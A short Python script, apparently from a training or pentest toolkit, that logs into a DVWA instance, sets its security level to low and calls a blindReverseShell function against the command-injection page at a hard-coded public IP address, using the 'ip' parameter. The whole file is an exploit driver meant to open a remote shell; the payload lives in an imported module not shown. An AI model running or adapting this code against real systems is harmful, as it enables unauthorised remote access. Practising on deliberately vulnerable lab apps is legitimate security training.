from .reverse_shell_script import blindReverseShell
from ..services.dvwa_login_service import getDVWALogin

cookies = {
    "PHPSESSID": getDVWALogin()['PHPSESSID'],
    "security": "low"
}

blindReverseShell("http://45.147.96.25:4242/vulnerabilities/exec/", "ip", cookies)